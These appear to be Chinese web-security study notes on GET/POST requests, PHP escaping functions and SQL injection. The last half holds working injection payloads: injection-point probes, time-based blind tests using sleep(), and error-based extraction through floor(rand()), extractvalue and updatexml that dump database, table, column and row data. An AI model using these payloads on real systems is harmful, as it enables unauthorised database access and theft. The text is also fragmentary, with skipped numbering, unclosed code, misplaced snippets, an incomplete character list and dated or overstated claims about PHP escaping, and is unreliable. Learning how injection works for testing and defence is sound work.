GET请求和POST请求

1.GET请求

①GET请求：用于从服务器中获取数据。

②GET请求是将表单中的数据按 name=value 的形式，添加到 action 所指向的 URL 后面通过URL请求来传递用户输入的数据。

③GET请求的参数接在URL后面，两者间用?连接，每个参数间用&连接。

④GET请求采用URL编码。

⑤GET请求发送的数据长度有限制。

1、IE

IE浏览器（Microsoft Internet Explorer） 对url长度限制是2083（2K+53），超过这个限制，则自动截断。

2、firefox

firefox（火狐浏览器）的url长度限制为 65 536字符，但实际上有效的URL最大长度不少于100,000个字符。

3、chrome

chrome（谷歌）的url长度限制超过8182个字符返回414错误。

4、Safari

Safari的url长度限制至少为 80 000 字符。

5、Opera

Opera 浏览器的url长度限制为190 000 字符。Opera 9 地址栏中输入190 000字符时依然能正常编辑。

⑥GET请求会将敏感数据显示在地址栏上。

如果不是敏感数据可以使用GET请求来传递，敏感数据最好不要使用GET请求方式进行传送不安全。

2.POST请求

①POST请求通常是用来向服务器提交数据的。

②POST请求一般是以表单输入框的方式填写用户的数据，把表单数据发送给服务器验证的一个过程。

③POST请求没有长度的限制。

④POST请求支持多种编码方式。

⑤POST请求的参数不会被保留，而GET请求的参数会被完整保留在浏览器历史记录里。

⑥POST相对于GET来说更安全。一般网页都用POST请求来发送敏感数据。

4.mysql_query常常和mysql_fetch_array一起连用

例子：

$tempresult=mysql_query (“SQL语句”);
while ($row = mysql_fetch_array($tempresult))
{
print $row[0]; //打印第一列的记录

数组变量 $row 被 mysql_fetch_array 函数建立并用查询的结果字段来填充，数组的每一个分量对应于查询结果的每一个字段 。

5.addslashes()和htmlspecialchars()的相同和区别

二者都用来都特殊符号进行转义，用于防止SQL语句的注入。

①addslashes()通常用于防止sql注入，它可对通过get，post和cookie传递过来的参数的单引号、双引号、\以及null前加“\”进行转义

如：如变量$str=$_POST[“str”];的值为：bb’ or 1=’1。通过addslashes()函数过滤后会变为：bb斜杆' or 1=斜杆'1。

②htmlspecialchars()也是对字符进行转义，与addslashes（）不同的是htmlspecialchars()是将特殊字符用引用实体替换。

③addslashes()在执行sql语句前对通过get、post和cookie传递来的参数中的单引号，双引号,\ 和null进行转义。但sql执行成功后，插入到数据库中的数据是不带有转义字符\的。这时如果插入到数据库中的是一些js脚本，当这些脚本被读取出来时还是会被执行。

这时我们可对读取出来的数据使用htmlspecialchars()进行过滤，避免执行被注入的脚本。

④在使用这两个函数之前需要先使用get_magic_quotes_gpc()验证下php.ini配置文件里的magic_quotes_gpc设置是否自动为GPC(get,post,cookie)传来的数据中的’”加上反斜线。如果没有确定直接使用该函数，可能造成双层转义。

6.get_magic_quotes_gpc()

用于检验php.ini配置文件中magic_quotes_gpc的设置是否开启自动为GPC(GET,POST,COOKIE)传来的数据进行转义。

if (ctype_digit($testcase)) {
echo “The string $testcase consists of all digits.\n”;
} else {
echo “The string $testcase does not consist of all digits.\n”;

8.mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：

  • \x1a

SQL注入点判断

1.注入点可以分为两大类

字符型注入和数字型注入

两大类下用可以分成 GET注入和POST注入

常见的字符型注入有

‘’,(‘’),((‘’)),””,(“”),((“”))等

2.判断注入点

1.数字型

第一步：?id=1 回显正常

第二步：?id=1’ 语法报错

第三步：?id=1 and 1=1 回显正常

第四步：?id=1 and 1=2 页面错误

符合以上四点可以判断为数字型注入。

如果?id=1 and 1=2 回显正常则不是数字型。

2.字符型

依据数字型方法进行判断。

SQL延迟注入+布尔注入

sleep(睡眠时间)；

if(a,b,c)

a为真，执行b，最后执行c.

当测试注入点时，无论对错，页面都没回显出信息时使用延迟注入。

1.判断注入点

?id=1’ and sleep(5);

如果睡眠5秒则存在注入点，反之。

2.判断数据库长度

?id=1’ and if(length(database())=8,sleep(5),1)

如果数据库长度为8，则执行sleep 页面会睡眠5秒。

sql盲注

1.报错注入

例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;

需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand()0-1随机数函数，group by 分组。

rand(0) 指定一个固定参数可以制造一个伪随机序列。即可以预测下次出啥数字。

这个报错是利用排序时插入的key值不能相同而报错。利用报错回显出key值。

2.extactvalue(null,concat());2个参数

extractvalue注入的原理：extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。

传入错误路径参数concat()，比如开头不能是~，：等 即0x7e，0x3a等来报错回显。

id=’ or extractvalue(null,concat(0x3a,(select id from users limit 0,1),0x3a))

3.updatexml(null,concat(),null);3个参数

两者都用于处理xml文件，extra相当于取出来数据，update就是跟新文件内容。

原理和extactvalue一样。

id=’ or updatexml(1,concat(0x3a,(select id from users limit 0,1),0x3a),1)

爆数据库 concat(0x3a,(select database()),0x3a)

爆表名concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),0x3a)

concat(0x3a,(select table_name from information_schema.tables where table_schema=’数据库名’ limit 0,1),0x3a)

limit 0,1 从第0个开始查第一个：1,1就是查第二个。

爆列名concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’表名’),0x3a)

爆数据concat(0x3a,(select 列名 from 表明 limit 0,1),0x3a)

Ⅱ.concat_ws(separator, str1, str2, …)第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。
Ⅲ.group_concat()默认以逗号分隔。
